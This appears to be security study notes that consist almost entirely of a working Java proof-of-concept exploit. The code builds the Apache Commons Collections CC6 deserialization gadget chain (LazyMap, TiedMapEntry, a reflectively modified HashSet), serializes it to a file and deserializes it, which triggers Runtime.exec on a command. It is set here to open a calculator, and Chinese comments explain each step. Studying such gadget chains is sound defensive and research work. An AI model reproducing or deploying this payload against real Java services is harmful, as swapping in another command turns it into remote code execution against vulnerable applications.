# Payload
```java
public class Exploit {

    public static void main(String[] args) throws Exception {
        // InstantiateTransformer gadget chain
        // Transformer chainedTransformer = getChained2InstantiateV4();
        String command = "open -a calculator";
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command})
        };

        Transformer chainedTransformer  = new ChainedTransformer(transformers);

        final Map innerMap = new HashMap();

        // lazyMap
        // cc 4.4
        Map map = LazyMap.decorate(innerMap, chainedTransformer);

        TiedMapEntry entry = new TiedMapEntry(map, "fe1w0");

        // set.map = new HashMap
        HashSet set = new HashSet();

        // 使 set.map.table 多出一个 Node，即 entry
        // 直接 add 方式 也可以做到 gadget chains 利用，但无法用于序列化
        // set.add(entry);

        // ysoserial 的方案，是直接反射 ValueField 修改 map
        // 此处，我的对Map的理解就不是很深。

        // step 0: 促使 Map.table 构建
        set.add("foo");

        // step 1: 获取 set.map
        Field classSetFieldMap = HashSet.class.getDeclaredField("map");
        classSetFieldMap.setAccessible(true);
        HashMap setInnerMap = (HashMap) classSetFieldMap.get(set);


        // step 2: 获取 set.map.table
        // 需要注意是的：
        // 即便 HastMap.table 是 transient
        // 但在writeObject中调用的internalWriteEntries，会将table中的内容进行序列化
        Field classHashMapFieldTable = HashMap.class.getDeclaredField("table");
        // modifiers "transient"
        classHashMapFieldTable.setAccessible(true);
        Object[] tableArray = (Object[]) classHashMapFieldTable.get(setInnerMap);

        // 默认 为 16
        System.out.println(tableArray.length);

        // step 3: 设置 set.map.table[0].key
        Object targetNode = null;

        for (Object node : tableArray) {
            if (node != null) {
                targetNode = node;
            }
        }

        // step 4: 将 entry 存储为 targetNode.key
        Field classNodeFieldKey = targetNode.getClass().getDeclaredField("key");
        System.out.println(targetNode.getClass().getName());
        classNodeFieldKey.setAccessible(true);
        classNodeFieldKey.set(targetNode, entry);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("out/serFile/cc6.ser"));
            outputStream.writeObject(set);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("out/serFile/cc6.ser"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }

    }
}
```